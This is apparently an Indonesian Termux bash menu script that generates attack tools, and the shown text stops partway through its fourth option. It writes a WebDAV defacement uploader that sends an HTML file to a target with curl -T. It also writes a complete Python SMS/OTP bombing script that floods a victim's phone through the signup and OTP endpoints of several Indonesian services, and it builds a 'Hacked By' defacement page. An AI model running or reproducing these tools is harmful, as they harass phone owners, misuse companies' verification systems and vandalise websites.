clear
echo -e '''
\e[1;36m ██████████     █████████   ███████████   █████   ████            ███████████    ███████       ███████    █████        █████████ 
\e[1;32m░░███░░░░███   ███░░░░░███ ░░███░░░░░███ ░░███   ███░            ░█░░░███░░░█  ███░░░░░███   ███░░░░░███ ░░███        ███░░░░░███
\e[1;36m ░███   ░░███ ░███    ░███  ░███    ░███  ░███  ███              ░   ░███  ░  ███     ░░███ ███     ░░███ ░███       ░███    ░░░ 
\e[1;32m ░███    ░███ ░███████████  ░██████████   ░███████     ██████████    ░███    ░███      ░███░███      ░███ ░███       ░░█████████ 
\e[1;36m ░███    ░███ ░███░░░░░███  ░███░░░░░███  ░███░░███   ░░░░░░░░░░     ░███    ░███      ░███░███      ░███ ░███        ░░░░░░░░███
\e[1;32m ░███    ███  ░███    ░███  ░███    ░███  ░███ ░░███                 ░███    ░░███     ███ ░░███     ███  ░███      █ ███    ░███
\e[1;36m ██████████   █████   █████ █████   █████ █████ ░░████               █████    ░░░███████░   ░░░███████░   ███████████░░█████████ 
\e[1;32m░░░░░░░░░░   ░░░░░   ░░░░░ ░░░░░   ░░░░░ ░░░░░   ░░░░               ░░░░░       ░░░░░░░       ░░░░░░░    ░░░░░░░░░░░  ░░░░░░░░░  
                                                                                                                                 
                                                                                                                                 
                                                                                                                                 
'''


echo -e '\e[0;32m[\e[0;31m!\e[0;32m]\e[1;37m===============================\e[0;32m[\e[0;31m!\e[0;32m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m1\e[1;33m]\e[0;36mDARK WEBDAV                 \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m2\e[1;33m]\e[0;36mDARK SMS                    \e[1;33m[\e[1;32m*]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m3\e[1;33m]\e[0;36mPEMBUAT SCRIPT DEFACE       \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m4\e[1;33m]\e[0;36mTOOLS INSTALLER             \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31m5\e[1;33m]\e[0;36mDARK ADMIN-FINDER           \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[1;33m[\e[1;32m*\e[1;33m][\e[0;31mx\e[1;33m]\e[0;36mKELUAR                      \e[1;33m[\e[1;32m*\e[1;33m]'
echo -e '\e[0;32m[\e[0;31m!\e[0;32m]\e[1;37m===============================\e[0;32m[\e[0;31m!\e[0;32m]'
echo ''
echo ''
echo ''
echo ''
echo -e '\e[1;36m'
read -p 'pilih nomor berapa ~> ' pilih
if
[ $pilih = 1 ]
then
echo -e '\e[1;36m'
read -p $'nama anda ~> ' nama
cd $HOME
rm DARK-WEBDAV.sh
cat <<jajan>DARK-WEBDAV.sh
echo -e '''\e[0;35m
██████╗  █████╗ ██████╗ ██╗  ██╗    ██╗    ██╗███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║
██║  ██║███████║██████╔╝█████╔╝     ██║ █╗ ██║█████╗  ██████╔╝██║  ██║███████║██║   ██║
██║  ██║██╔══██║██╔══██╗██╔═██╗     ██║███╗██║██╔══╝  ██╔══██╗██║  ██║██╔══██║╚██╗ ██╔╝
██████╔╝██║  ██║██║  ██║██║  ██╗    ╚███╔███╔╝███████╗██████╔╝██████╔╝██║  ██║ ╚████╔╝ 
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═════╝ ╚═╝  ╚═╝  ╚═══╝  
                                                                                       
'''
echo -e '\e[1;36m'
echo -e '[][][][][][][][][][][][][][]'
echo -e '[#] author $nama [#]'
echo -e '[#] WELLCOME TO MY TOOLS [#]'
echo -e '[][][][][][][][][][][][][][]'
echo ''
echo ''
echo ''
read -p 'masukkan target anda ~> ' ww
read -p 'masukkan file html anda ~> ' le
curl -T /$HOME/$le $ww
jajan
fi
if
[ $pilih = 2 ]
then
read -p 'nama anda ~> ' nama1
cd $HOME
rm DARK-SMS.py
cat <<sms>DARK-SMS.py
#anjim
#lu decodee
#huh
M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[92m'
W = '\033[1;37m'
A = '\033[90m'

try:
	
	import mechanize, requests, random, sys, os, re
	from time import sleep
	from cookielib import LWPCookieJar as Cookie
	from requests.exceptions import ConnectionError

	os.system('clear')

	def Tik(s):
		for i in s + '\n':
			sys.stdout.write(i)
			sys.stdout.flush()
			sleep(random.random() * 0.0010)
	
	def Banner():
		Tik(''+C+'''
\033[1;97m
    /\_/\           ___
   = o_o =_______    \ \  - author $nama1 -
    __^      __(  \.__) )
(@)<_____>__(_____)____/
==================================================
contoh nomor yang salah \033[1;91m:\033[1;96m8729xxxxxxx\033[1;97m
contoh nomor yang benar \033[1;91m:\033[1;96m08729xxxxx\033[1;97m
  '''+W+'Creator : $nama1 \n\t\t')

	def MapClub(Phone, Amount):
		for _ in range(Amount):

			sleep(5)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'Referer' : 'https://mapclub.com/id/user/signup'
			}

			postData = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data = {'phone' : Phone}, allow_redirects = True)

			if 'error' in postData.text:
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE No '+C+str(Phone)+W+' STATUS GAGAL WKWKWK'+M+' \xE2\x9C\x96')
			
			else:
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO '+C+str(Phone)+W+' STATUS BERHASIL'+H+' \xE2\x9C\x94')
					
	def Hooq(Phone, Amount):
		for _ in range(Amount):

			sleep(5)
			bro = mechanize.Browser()
			Cookies = Cookie('.cookieslog')

			bro.set_handle_robots(False)
			bro.set_cookiejar(Cookies)

			bro.addheaders = [
			('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9'),
			('Referer', 'https://authenticate.hooq.tv/signupmobile?return?Url=https://www.hooq.tv/auth//verify/ev%2F%257Cid')
			]

			bro.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://www.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cid&serialNo=0&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-8.4.1&deviceSignature=0')
			bro.select_form(nr=0)		
			bro.form ['mobile'] = str(Phone)
			submit = bro.submit()

			if 'Your+number+has+been+blocked.' in submit.geturl():
				print(W+'NOMOR TARGET UDAH DI BLOKIR\n'+C+'SAMA PIHAK HOOQ ANJIN* . '+W+'COBA NOMOR LAIN AJA -_-x')
				sys.exit() 
			
			elif 'buCode' in submit.geturl():
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO '+C+str(Phone)+W+' STATUS BERHASIL'+H+' \xE2\x9C\x94')
			
			else:
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO '+C+str(Phone)+W+' STATUS GAGAL'+M+' \xE2\x9C\x96')

	def HarVest(Phone, Amount):
		for _ in range(Amount):
		
			sleep(5)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'Referer' : 'https://harvestcakes.com/register'
			}

			data = {
			'phone' : Phone,
			'url' : ''
			}

			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers

			postData = Sess.post('https://harvestcakes.com/register', data = data, allow_redirects = True)

			if 'Enter OTP code we sent via SMS on phone number' in postData.text:
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO '+C+str(Phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
				Sess.cookies.save()
			
			else:
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO '+C+str(Phone)+W+' GAGAL WKWKWKWKWK'+M+' \xE2\x9C\x96')

	def Olx(Phone, Amount):
		for _ in range(Amount):
		
			sleep(5)
			headers = {
			'user-agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'referer' : 'https://www.olx.co.id/'
			}
	
			data = {
			'grantType' : 'phone',
			'phone' : Phone,
			'language' : ''
			}
		
			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers
		
			postData = Sess.post('https://www.olx.co.id/api/auth/authenticate', json = data, allow_redirects = True)
		
			if 'PIN' and 'token' in postData.text:
				print(W+'['+C+'*'+W+'] LAGI SPAM KE NO '+C+str(Phone)+W+'STATUS BERHASIL'+H+' \xE2\x9C\x94')
				Sess.cookies.save()
			
			else:
				print(W+'['+C+'*'+W+'] LAGI SPAM KE NO '+C+str(Phone)+W+'STATUS GAGAL -_-'+M+' \xE2\x9C\x96')
			
	def Tokped(Phone, Amount):
		for _ in range(Amount):
		
			sleep(30)
			headers = {
			'Connection' : 'keep-alive',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest',
			'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
			'Accept-Encoding' : 'gzip, deflate'
			}

			TokenSite = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+Phone+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D'+Phone+'%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
			SearchToken = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', TokenSite).group(1)
		
			data = {
			'tk' : SearchToken,
			'msisdn' : Phone,
			'otp_type' : '116',
			'number_otp_digit' : '6',
			'email' : '',
			'original_param' : '',
			'user_id' : '',
			'signature' : '',
			}
		
			postData = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-sms', data = data, headers = headers)
		
			if '"success": true' in postData.text:
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO '+C+str(Phone)+W+' [STATUS] BERHASIL'+H+' \xE2\x9C\x94')
			
			else:
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO '+C+str(Phone)+W+' [STATUS] GAGAL -_-'+M+' \xE2\x9C\x96')
			
	def AlfaMart(Phone, Amount):
		for _ in range(Amount):
		
			sleep(5)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
			'Referer' : 'https://www.alfacart.com/login?tab=daftar&return='
			}
		
			data = {
			'fullName' : 'Yt MR_DARL',
			'red' : 'customer%2Faccount',
			'email' : 'DARK@gmail.com',
			'password' : 'Subscribe Channel Gua Yak',
			'isNewsletter' : 'on'
			}
		
			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers

			postData = Sess.post('https://www.alfacart.com/getMemberInfo', data = {'email' : 'DARK@gmail.com'})
			postData_2 = Sess.post('https://www.alfacart.com/otp/checkActiveNumber', data = {'phoneNumber' : Phone, 'email' : 'DARK@gmail.com'})
			postData_3 = Sess.post('https://www.alfacart.com/otp/phoneNumberRegistration', data = {'phoneNumber' : Phone})
			postData_4 = Sess.post('https://www.alfacart.com/doRegister', data = data)
		
			if 'responseMessage":"Nomor terverifikasi dan dapat diubah.","status":true' in postData_2.text:
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO '+C+str(Phone)+W+' [STATUS] BERHASIL'+H+' \xE2\x9C\x94')
				Sess.cookies.save()
			
			else:
				print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO '+C+str(Phone)+W+' [STATUS] GAGAL'+M+' \xE2\x9C\x96')
	
	def Phd(Phone, Amount):
	
		if str(Phone).startswith('08', 0) == True:
			Phone = Phone.replace('08', '8')

		for _ in range(Amount):

			sleep(5)
			headers = {
			'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
			'Referer' : 'https://www.phd.co.id/en/users/createnewuser'
			}

			data = {
			'requests_id' : '',
			'first_name' : 'Subscribe YT',
			'last_name' : 'MR_DARK',
			'gender' : 'male',
			'phone_number' : Phone,
			'birthday' : '0000-00-00',
			'username' : 'YouTube@gmail.com',
			'password' : 'Subscribe 1000x Ya Anying',
			'agreeterms' : '1'
			}

			Sess = requests.Session()
			Sess.cookies = Cookie('.cookieslog')
			Sess.headers = headers

			postData = Sess.post('http://www.phd.co.id/en/users/createNewUser', data = data , allow_redirects = True)
			Sess.cookies.save()
		
			print(W+'['+C+'*'+W+'] LAGI SPAM ANJIM KE NO  '+C+str(Phone)+W+' [STATUS] BERHASIL'+H+' \xE2\x9C\x94')
		
	def Spam():
		Banner()
		print
		Tik(W+50*'=')
		Tik(C+'\tSPAMS\t\t BATAS\t\tSTATUS')
		Tik(W+50*'=')
		print
		Tik(C+50*'#')
		Tik(C+'['+W+'1'+C+']'+W+' SPAM OTP MAPCLUB'+W+'\tUNLIMITED'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'2'+C+']'+W+' SPAM OTP HOOQ'+W+'\tBELUM TAU'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'3'+C+']'+W+' SPAM OTP HARVEST'+W+'\t6X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'4'+C+']'+W+' SPAM OTP OLX'+W+'\tUNLIMITED'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'5'+C+']'+W+' SPAM OTP TOKOPEDIA'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'6'+C+']'+W+' SPAM OTP ALFAMART'+W+'\t4X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'7'+C+']'+W+' SPAM OTP PHD'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'8'+C+']'+W+' COMBO ALL 3 OTP'+K+'\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'9'+C+']'+W+' REPORT BUG'+K+'\t\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'=')
		Tik(C+'['+W+'X'+C+']'+W+' EXIT / KELUAR'+K+'\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
		Tik(C+50*'#')
		print
		print
		try:
			requests.get('http://google.com')
	
		except ConnectionError:
			print
			print(M+'CEK KONEKSI JARINGAN !')
			sys.exit()
		
		PilihTools = raw_input(W+'Pilih Mana Anyin*'+C+' ~> '+W+'')
		
		if PilihTools == '1':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP MAPCLUB')
				Tik(C+'\t\t'+16*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'LU BUTA YA!'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM!'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 10:
					print
					print(W+'\tKE BANYAKAN ANJIN*'+C+'\n\tMAU TOOLS INI MATI?!'+W+' -_-x')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				MapClub(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'LU BUTA ANYING'+M+' \xE2\x9C\x96')
				sys.exit()
		
		elif PilihTools == '2':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP HOOQ')
				Tik(C+'\t\t'+13*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tKE BANYAKAN GOBLO*'+C+'\n\tMAU TOOLS INI MATI?!'+W+' -_-x')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				Hooq(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '3':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP HARVEST')
				Tik(C+'\t\t'+17*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tKEBANYAKAN GOBLO*'+C+'\n\tMAU TOOLS INI MATI?!'+W+' -_-x')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				HarVest(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '4':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP OLX')
				Tik(C+'\t\t'+12*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 10:
					print
					print(W+'\tJANGAN BANYAK BANYAK KALO GAK'+C+'\n\tMAU TOOLS INI MATI'+W+' ^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				Olx(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
	
		elif PilihTools == '5':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP TOKOPEDIA')
				Tik(C+'\t\t'+19*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tUDAH LEWAT LIMIT ITU JUMLAHNYA'+C+'^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				Tokped(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '6':
			try:
			
				print
				Tik(W+'\t\tSPAM OTP ALFAMART')
				Tik(C+'\t\t'+17*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				Phone = int(Phone) 
			
				Amount = input(''+W+'\tJUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
				if Amount > 5:
					print
					print(W+'\tUDAH LEWAT LIMIT ITU JUMLAHNYA'+C+'^_^')
					print
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				AlfaMart(Phone, Amount)
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '7':
			try:
				print
				Tik(W+'\t\tSPAM OTP PHD')
				Tik(C+'\t\t'+12*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
			
				else:
					pass
				
				Phone = int(Phone) 
				print
				print(C+'PHD'+W+' AUTO 3X SEND') 
				sleep(2)
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				print(W+'JIKA TIDAK TERKIRIM, BERARTI SUDAH LIMIT !')
				print
				Phd(Phone, 3) # DON'T CHANGE / JANGAN DI UBAH
		
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
			
		elif PilihTools == '8':
			try:
			
				print
				Tik(W+'\t\tSPAM COMBO OTP')
				Tik(C+'\t\t'+14*'=')
				print
				Phone = raw_input(W+'\tNOMOR TARGET ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
			
				if len(Phone) < 9:
					print
					print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
					sys.exit()
				
				else:
					pass
				
				print
				print(C+'\t-------------- '+W+'Starting'+C+' --------------')
				print
				print(C+'\t----------- '+W+'HOOQ 3X'+C+' -----------')
				print
				Hooq(Phone, 3)
				print
				print(C+'\t----------- '+W+'HARVEST 3X'+C+' -----------')
				print
				HarVest(Phone, 3)
				print
				print(C+'\t----------- '+W+'OLX 3X'+C+' -----------')
				print
				Olx(Phone, 3)
				print
				print(C+'\t----------- '+W+'TOKOPEDIA 3X'+C+' -----------')
				print
				Tokped(Phone, 3)
				print
				print(C+'\t----------- '+W+'ALFAMART 3X'+C+' -----------')
				print
				AlfaMart(Phone, 3)
				print
				print(C+'\t----------- '+W+'PHD 3X'+C+' -----------')
				print
				Phd(Phone, 3)
				print
				print(C+'\t----------- '+W+'MAPCLUB 3X'+C+' -----------')
				print
				MapClub(Phone, 3)
				print
				print(W+'Thanks Udah Coba Combo'+C+' ^_^')
				sys.exit()
			
			except ValueError:
				print
				print(W+'NOMOR TIDAK VALID'+M+' \xE2\x9C\x96')
				sys.exit()
			
			except SyntaxError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except NameError:
				print
				print(W+'HARUS ANGKA'+M+' \xE2\x9C\x96')
				sys.exit()
		
			except ConnectionError:
				print
				print(M+'TERJADI KESALAHAN JARINGAN !')
				sys.exit()
		
		elif PilihTools == '9':
			print ('ADA BUG?, COBA COMMAND DI VIDIO GW -_-')
		
		elif PilihTools == 'X' or PilihTools == 'x':
			print
			print(W+'JANGAN LUPA SUBREK GW: MR:DARK'+C+' -_-x')
			sys.exit()
			
		else:
			print
			print(W+'lu buta bro?'+C+' -_-x')
		
except ImportError:
	os.system('clear')
	print(C+'Module lu belum kepasang anjim'+W+' -_-')
	print(W+'Gw lagi install module untuk lu'+C+' ...')
	sleep(1.5)
	print
	os.system('pip2 install -r requirements.txt')
	print
	print(C+'Selesai'+W+' -_-') 
	sleep(1.5)
	os.system('clear')
	
if __name__ == '__main__':
        print('''
-Subscribe MR_DARK-                                                                                         
''')
	print(C+'Subrek YT'+W+' Gua Dulu Ya!'+C+' :v')
	sleep(2)
	os.system('clear')
	os.system('xdg-open https://youtube.com/channel/UCnti7B0HaFE0izlHKwZMn8A')
	sleep(7)
	Spam()
sms
echo 'file tersimpan di HOME termux dengan nama file DARK-SMS.py'
fi
if
[ $pilih = 3 ]
then
termux-setup-storage
read -p $'\e[32mNama Anda :\e[0m ' user3
read -p $'\e[32mpesan pertama  :\e[0m ' pesanf
read -p $'\e[32mpesan kedua  :\e[0m ' pesang
read -p $'\e[32mpesan ketiga  :\e[0m ' pesanh
read -p $'\e[32mpesan keempat  :\e[0m ' pesanj
cd /sdcard
rm index.html
cat <<ha>index.html
<html>
<head>
<title<Hacked By $user3</title>

    <style>
            body {
              background: url(https://vignette.wikia.nocookie.net/steven-universe/images/a/a6/Space_like.gif/revision/latest?cb=20170413133510) no-repeat center center fixed;
              -webkit-background-size: cover;
              -moz-background-size: cover;
              -o-background-size: cover;
              background-size: cover;
              </style>

<style>
 h1{
     color: #00e2bd;
     text-align: center;
     font: 46px fantasy;
     size: 70px;
     text-shadow: 0px 0px 60px #d10000;
     </style>
     <h1>Hacked by $user3</h1><hr size="10px" width="98%" height="6px" color="#0090bc" position="top" top="4px">

     <center>
     <img src="http://3.bp.blogspot.com/-dCijSi1fl4s/Vc6jF5hFEOI/AAAAAAAABGE/4Q4tDf4ZgUE/s1600/Garuda%2BPancasila.png" height="300" width="270"
     </center>

     <br><div style="text-align: center;"><script language="JavaScript">
    var text="( pesan untuk anda )<br>$pesanf<br>$pesang<br>$pesanh<br>$pesanj<br>SCRIPT BY MR_DARK :) "
    var delay=90;
    var currentChar=100;
    var destination=[none];
    function type()
    {
    //if (document.all)
    {
    var dest=document.getElementById(destination);
    if (dest)// && dest.innerHTML)
    {
    dest.innerHTML=text.substr(0, currentChar)+"<blink>_</blink>";
    currentChar++;
    if (currentChar>text.length)
    {
    currentChar=1;
    setTimeout("type()", 5000);
    }
    else
    {
    setTimeout("type()", delay);
    }
    }
    }
    }
    function startTyping(textParam, delayParam, destinationParam)
    {
    text=textParam;
    delay=delayParam;
    currentChar=1;
    destination=destinationParam;
    type();
    }
    </script>
    <b><font face="courier new"><div id="textDestination" style=" background-color: ; color:#00e2bd; style=" font: 50px arial; color: #00e2bd; margin: 0px;"></div></b>

    <script language="JavaScript">
    javascript:startTyping(text, 50, "textDestination");
    </script></div>

<hr size="10px" left="100%" width="100%" height="6px" color="#0090bc" position="buttom" style="position: fixed; width: 98%; bottom: 0px;">
<audio src="https://i.top4top.io/m_16036g6f61.mp3" autoplay="true" loop="true"></audio> 
<center>
<audio autoplay="autoplay" controls="controls" src="https://i.top4top.io/m_16036g6f61.mp3" type="audio/mpeg"></audio>
</center>
ha
echo 'file tersimpan di storage hp mu dengan nama file index.html'
fi




if

[ $pilih = 4 ]
then
read -p 'nama untuk author ~> ' author

cd $HOME

rm Tools-Installer.sh
cat <<Tool>Tools-Installer.sh
clear
#!/bin/bash
#installer
echo "[+]sabar sebentar skuy"
sleep 2
echo "[+]sebentar lagi skuy" 
sleep 5
echo "[+]ok berkat kesabaran kamu masuk ke tools saya " 
sleep 3
clear
echo -e '''\e[1;37m
 ███████████                   ████                     █████                     █████              ████                    
░█░░░███░░░█                  ░░███                    ░░███                     ░░███              ░░███                    
░   ░███  ░   ██████   ██████  ░███   █████             ░███  ████████    █████  ███████    ██████   ░███   ██████  ████████ 
